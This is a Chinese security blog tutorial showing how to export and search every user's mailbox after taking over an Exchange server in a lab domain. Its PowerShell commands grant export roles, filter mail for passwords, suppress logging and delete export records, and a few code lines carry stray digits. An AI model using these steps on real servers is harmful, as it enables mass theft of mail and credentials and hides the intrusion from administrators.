**目录**

[使用PSSession连接Exchange服务器管理邮件](#t0 "使用PSSession连接Exchange服务器管理邮件")

[导出邮件](#t1 "导出邮件")

[导出所有用户的所有邮件](#t2 "导出所有用户的所有邮件")

[导出指定用户的所有邮件](#t3 "导出指定用户的所有邮件")

[筛选导出邮件](#t4 "筛选导出邮件")

[导出请求记录](#t5 "导出请求记录")

[使用powershell脚本导出邮件](#t6 "使用powershell脚本导出邮件")

[搜索邮件](#t7 "搜索邮件")

[搜索邮件的常用命令](#t8 "搜索邮件的常用命令")

[使用powershell脚本搜索](#t9 "使用powershell脚本搜索")

[在Exchange服务器上直接管理邮件](#t10 "在Exchange服务器上直接管理邮件")

[导出邮件](#%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6 "导出邮件")

[导出所有用户的所有邮件](#t11 "导出所有用户的所有邮件")

[导出指定用户的所有邮件](#t12 "导出指定用户的所有邮件")

[使用powershell脚本导出邮件](#%E4%BD%BF%E7%94%A8powershell%E8%84%9A%E6%9C%AC%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6 "使用powershell脚本导出邮件")

[搜索邮件](#%E6%90%9C%E7%B4%A2%E9%82%AE%E4%BB%B6 "搜索邮件")

[搜索邮件的常用命令](#%E6%90%9C%E7%B4%A2%E9%82%AE%E4%BB%B6%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4 "搜索邮件的常用命令")

[使用powershell脚本搜索](#%E4%BD%BF%E7%94%A8powershell%E8%84%9A%E6%9C%AC%E6%90%9C%E7%B4%A2 "使用powershell脚本搜索")

* * *

当我们拿到了Exchange邮箱服务器权限后，我们可以进行进一步的利用。比如导出所有用户的邮件、搜索特定用户的敏感邮件等等。

使用PSSession连接Exchange服务器管理邮件
============================

首先使用PSSession连接Exchange服务器

```
#使用PSSession连接Exchange服务器      
$User = "xie\administrator"      
$Pass = ConvertTo-SecureString -AsPlainText P@ssword1234 -Force      
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass      
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://mail.xie.com/PowerShell/ -Authentication Kerberos -Credential $Credential      
Import-PSSession $Session -AllowClobber       
#查看所有用户邮箱地址      
Get-Mailbox       1
#查看PSSession      1
Get-PSSession      1
#断开PSSession      1
Remove-PSSession $Session
```


![](https://img-blog.csdnimg.cn/20210705152435466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

导出邮件
----

在使用PSSession连接Exchange服务器后，执行以下操作导出邮件

1.  将用户添加到角色组”Mailbox Import Export”
2.  重新启动Powershell否则，无法使用命令`New-MailboxexportRequest`
3.  导出邮件，导出的文件格式后缀为 .pst，可以用 outlook打开

将用户从角色组”Mailbox Import Export” 添加、移除

```
#将用户hack添加到Mailbox Import Export组      
New-ManagementRoleAssignment –Role "Mailbox Import Export" –User administrator       
#查看Mailbox Import Export组内的用户      
Get-ManagementRoleAssignment –Role "Mailbox Import Export"|fl user       
#将用户hack从Mailbox Import Export组移除      
Remove-ManagementRoleAssignment -Identity "Mailbox Import Export-administrator      
" -Confirm:$false
```


![](https://img-blog.csdnimg.cn/20210705160657960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 导出所有用户的所有邮件

导出所有用户的所有邮件到 C:\\users\\public\\ 目录下

```
Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%{New-MailboxexportRequest -mailbox $_.name -FilePath ("\\localhost\c$\users\public\"+($_.name)+".pst") -CompletedRequestAgeLimit 0 }
```


![](https://img-blog.csdnimg.cn/20210705161506498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 导出指定用户的所有邮件

导出指定administrator用户的所有邮件到 C:\\users\\public\\ 目录下

```
$Username = "administrator"      
New-MailboxexportRequest -mailbox $Username -FilePath ("\\localhost\c$\users\public\"+$Username+".pst") -CompletedRequestAgeLimit 0
```


![](https://img-blog.csdnimg.cn/20210705161058633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 筛选导出邮件

筛选出指定用户的administrator中包含pass的邮件，保存到Exchange服务器的c:\\users\\public\\目录下

```
$User = "administrator"      
New-MailboxexportRequest -mailbox $User -ContentFilter {(body -like "*密码*")} -FilePath ("\\localhost\c$\users\public\"+$User+".pst") -CompletedRequestAgeLimit 0
```


![](https://img-blog.csdnimg.cn/20210705161707107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 导出请求记录

导出后会自动保存导出请求的记录，默认为30天，如果不想保存导出请求，可以加上参数

```
-CompletedRequestAgeLimit 0
```


其他关于导出请求记录命令

```
#查看邮件导出请求      
Get-MailboxExportRequest       
#删除所有导出请求      
Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false       
#删除某个导出请求      
Remove-MailboxExportRequest -Identity 'xie.com/Users/hack\MailboxExport' -Confirm:$false
```


![](https://img-blog.csdnimg.cn/20210705162456969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用powershell脚本导出邮件
------------------

该powershell脚本作者：[3gstudent](https://3gstudent.github.io "3gstudent")，地址为：[https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToExportMailfromExchange.ps1](https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToExportMailfromExchange.ps1 "https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToExportMailfromExchange.ps1")

该脚本流程如下：

1.  使用PSSession连接到Exchange服务器
2.  判断使用的用户是否被加入到角色组”Mailbox Import Export” 如果未被添加，需要添加用户
3.  导出邮件并保存至Exchange服务器的c:\\users\\public ，格式为pst文件
4.  如果新添加了用户，那么会将用户移除角色组”Mailbox Import Export”
5.  清除PSSession

对脚本进行了简单的修改，使用命令如下：

**导出指定用户的所有邮件**

```
import-module .\UsePSSessionToExportMailfromExchange.ps1      
UsePSSessionToExportMailfromExchange -User "administrator" -Password "P@ssword1234" -MailBox "administrator" -ExportPath "\\localhost\c$\users\public\" -ConnectionUri "http://mail.xie.com/PowerShell/"
```


![](https://img-blog.csdnimg.cn/20210706094931101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**导出所有用户的所有邮件**

```
Import-Module .\UsePSSessionToExportAllUserMailfromExchange.ps1      
UsePSSessionToExportMailfromExchange -User "administrator" -Password "P@ssword1234" -ExportPath "\\localhost\c$\users\public\" -ConnectionUri "http://mail.xie.com/PowerShell/"
```


![](https://img-blog.csdnimg.cn/20210706094648378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

目前该功能已经集成到插件中

![](https://img-blog.csdnimg.cn/20210706101957220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210706103043748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

搜索邮件
----

### 搜索邮件的常用命令

基本流程同导出邮件类似，但是区别在于角色组`"Mailbox Import Export"`需要更换成`"Mailbox Search"`

```
#使用PSSession连接Exchange服务器      
$User = "xie\administrator"      
$Pass = ConvertTo-SecureString -AsPlainText P@ssword1234 -Force      
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass      
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://mail.xie.com/PowerShell/ -Authentication Kerberos -Credential $Credential      
Import-PSSession $Session -AllowClobber       
#将用户添加到角色组”Mailbox Search”      
New-ManagementRoleAssignment –Role "Mailbox Search" –User administrator       1
#搜索所有包含单词pass的邮件并保存到用户test2的outAll文件夹      1
Get-Mailbox|Search-Mailbox -SearchQuery `"*pass*`" -TargetMailbox "test" -TargetFolder "outAll" -LogLevel Suppress| Out-Null       1
#搜索指定用户administrator中包含单词pass的邮件并保存到用户test的out文件夹      1
Search-Mailbox -Identity "administrator" -SearchQuery `"*pass*`" -TargetMailbox "test" -TargetFolder "out" -LogLevel Suppress| Out-Null
```


![](https://img-blog.csdnimg.cn/20210706111739610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

登录test用户邮箱，即可看到out和outAll收件箱。

![](https://img-blog.csdnimg.cn/20210706111857925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### `使用powershell脚本搜索`

该powershell脚本作者：[3gstudent](https://3gstudent.github.io "3gstudent")，地址为：[https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToSearchMailfromExchange.ps1](https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToSearchMailfromExchange.ps1 "https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToSearchMailfromExchange.ps1")

搜索所有用户的邮件中包含单词pass的邮件并保存到用户test的outAll文件夹：

```
UsePSSessionToSearchMailfromExchange -User "administrator" -Password "P@ssword1234" -MailBox "All" -ConnectionUri "http://mail.xie.com/PowerShell/" -Filter `"*pass*`" -TargetMailbox "test" -TargetFolder "outAll"
```


搜索指定用户administrator中包含单词pass的邮件并保存到用户test的out文件夹：

```
UsePSSessionToSearchMailfromExchange -User "administrator" -Password "P@ssword1234" -MailBox "administrator" -ConnectionUri "http://mail.xie.com/PowerShell/" -Filter `"*pass*`" -TargetMailbox "test" -TargetFolder "out"
```


![](https://img-blog.csdnimg.cn/20210706113024643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

目前该功能已经集成到插件中

![](https://img-blog.csdnimg.cn/img_convert/05aab1f48085a354d70f6b377bb6f501.png)

![](https://img-blog.csdnimg.cn/img_convert/b366cb07af4efe02d5a9493f27702741.png)

在Exchange服务器上直接管理邮件
===================

添加管理单元，不同Exchange版本对应的管理单元名称不同：

```
#Exchange 2007      
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin;      
#Exchange 2010      
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010;      
#Exchange 2013 & 2016:       
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;       
#获取所有用户邮箱(默认显示1000个)      
Get-Mailbox      1
#获取所有用户邮箱(加上-ResultSize参数，则显示所有)      1
Get-Mailbox -ResultSize unlimited       1
#只显示所有用户邮箱Name自段      1
Get-Mailbox|fl Name        1
#获得所有邮箱的信息，包括邮件数和上次访问邮箱的时间      1
Get-Mailbox | Get-MailboxStatistics       1
#获得所有OU      2
Get-OrganizationalUnit       2
#查询指定用户指定时间起发送邮件的记录      2
Get-MessageTrackingLog -EventID send -Start "01/11/2019 09:00:00" -Sender "test@xie.com"
```


![](https://img-blog.csdnimg.cn/2021070610441882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210706105944630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**导出邮件**
--------

### 导出所有用户的所有邮件

导出所有用户的邮件，保存到Exchange服务器的c:\\users\\public\\ 目录：

```
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;      
Get-Mailbox | %{New-MailboxexportRequest -mailbox $_.name -FilePath ("\\localhost\c$\users\public\"+($_.name)+".pst")}
```


![image.png](https://img-blog.csdnimg.cn/img_convert/8e5bae3c920a3d369e58a14d26e2ea6e.png)

### 导出指定用户的所有邮件

导出指定用户administrator的邮件，保存到Exchange服务器的c:\\users\\public\\ 目录：

```
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;      
$User = "administrator"      
New-MailboxexportRequest -mailbox $User -FilePath ("\\localhost\c$\users\public\"+$User+".pst")
```


![](https://img-blog.csdnimg.cn/20210705170837999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

[使用powershell脚本导出邮件](#%E4%BD%BF%E7%94%A8powershell%E8%84%9A%E6%9C%AC%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6 "使用powershell脚本导出邮件")
------------------------------------------------------------------------------------------------------------------------------

该powershell脚本作者：[3gstudent](https://3gstudent.github.io "3gstudent")，地址为：[https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectExportMailfromExchange.ps1](https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectExportMailfromExchange.ps1 "https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectExportMailfromExchange.ps1")

使用时需要指定Exchange版本

```
Import-module DirectExportMailfromExchange.ps1      
DirectExportMailfromExchange -MailBox "administrator" -ExportPath "\\localhost\c$\users\public\" -Filter "{`"(body -like `"*pass*`")`"}" -Version 2016
```


![](https://img-blog.csdnimg.cn/20210705171929713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

搜索邮件
----

### [搜索邮件的常用命令](#%E6%90%9C%E7%B4%A2%E9%82%AE%E4%BB%B6%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4 "搜索邮件的常用命令")

```
#枚举所有邮箱用户，显示包含关键词pass的邮件的数量      
Get-Mailbox|Search-Mailbox -SearchQuery `"*pass*`" -EstimateResultOnly       
#搜索邮箱用户test，显示包含关键词pass的邮件的数量      
Search-Mailbox -Identity test -SearchQuery `"*pass*`" -EstimateResultOnly       
#枚举所有邮箱用户，导出包含关键词pass的邮件至用户test的文件夹out中(不保存日志)      
Get-Mailbox|Search-Mailbox -SearchQuery `"*pass*`" -TargetMailbox "test" -TargetFolder "outall" -LogLevel Suppress       1
#搜索邮箱用户test，导出包含关键词pass的邮件至用户test的文件夹out中(不保存日志)      1
Search-Mailbox -Identity administrator -SearchQuery `"*pass*`" -TargetMailbox "test" -TargetFolder "out" -LogLevel Suppress
```


![](https://img-blog.csdnimg.cn/20210706155337782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210706155632898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 使用powershell脚本搜索

该powershell脚本作者：[3gstudent](https://3gstudent.github.io "3gstudent")，地址为：[https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectSearchMailfromExchange.ps1](https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectSearchMailfromExchange.ps1 "https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectSearchMailfromExchange.ps1")

搜索指定用户administrator中包含单词pass的邮件并保存到用户test的out文件夹：

```
DirectSearchMailfromExchange -MailBox "administrator" -Filter `"*pass*`" -TargetMailbox "test" -TargetFolder "out2" -Version 2016
```


搜索所有包含单词pass的邮件并保存到用户test的outAll文件夹：

```
DirectSearchMailfromExchange -MailBox "All" -Filter `"*pass*`" -TargetMailbox "test" -TargetFolder "outAll" -Version 2016
```


![](https://img-blog.csdnimg.cn/20210706154940944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210706155002208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考：[https://3gstudent.github.io/渗透基础-从Exchange服务器上搜索和导出邮件](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8EExchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%9C%E7%B4%A2%E5%92%8C%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6 "https://3gstudent.github.io/渗透基础-从Exchange服务器上搜索和导出邮件")